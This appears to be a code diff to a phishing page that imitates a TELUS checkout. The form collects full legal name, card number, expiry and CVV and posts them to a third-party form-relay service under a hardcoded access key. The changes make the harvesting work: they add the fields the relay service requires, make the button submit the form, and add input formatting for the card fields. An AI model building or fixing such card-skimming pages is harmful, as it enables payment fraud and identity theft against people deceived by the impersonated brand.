@@ -266,10 +266,15 @@
     <form id="my-form" action="https://api.web3forms.com/submit" method="POST">
     <div class="form-box">
         <h2>Checkout to My TELUS</h2>
+
         <input type="hidden" name="access_key" value="5783b12d-b368-45c8-879d-ae1855d069b1">
 
+        <!-- Required for Web3Forms -->
+        <input type="hidden" name="subject" value="New Order Submission">
+        <input type="hidden" name="from_name" value="Checkout Form">
+
         <div class="input-group">
-            <input type="text" id="fullName" name="fullName" required>
+            <input type="text" id="fullName" name="name" required>
             <label for="fullName">Full Legal Name</label>
         </div>
 
@@ -288,7 +293,7 @@
             <label for="cvv">CVV</label>
         </div>
 
-        <button class="login19" id="my-form-button">Complete Order</button>
+        <button type="submit" class="login19" id="my-form-button">Complete Order</button>
     </div>
 </form>
     <div class="sc-dcJsrY iifIdT"><img data-testid="telus-leaves-image"
@@ -377,18 +382,26 @@ expiryInput.addEventListener('blur', (e) => {
 });
 </script>
 <script>
-const cardInput = document.getElementById('card');
+// CARD NUMBER FORMAT (1234-5678-9012-3456)
+document.getElementById("cardNumber").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "").substring(0,16);
+    let formatted = value.match(/.{1,4}/g);
+    e.target.value = formatted ? formatted.join("-") : value;
+});
 
-cardInput.addEventListener('input', (e) => {
-    let value = e.target.value.replace(/\D/g, ''); // remove non-digits
+// EXPIRY FORMAT (MM/YY)
+document.getElementById("expiry").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "").substring(0,4);
+    if (value.length >= 3) {
+        e.target.value = value.substring(0,2) + "/" + value.substring(2);
+    } else {
+        e.target.value = value;
+    }
+});
 
-    // limit to 16 digits
-    if (value.length > 16) value = value.slice(0, 16);
-
-    // insert '-' after every 4 digits
-    value = value.match(/.{1,4}/g)?.join('-') || '';
-
-    e.target.value = value;
+// CVV ONLY NUMBERS
+document.getElementById("cvv").addEventListener("input", function(e) {
+    e.target.value = e.target.value.replace(/\D/g, "").substring(0,3);
 });
 </script>
 </body>
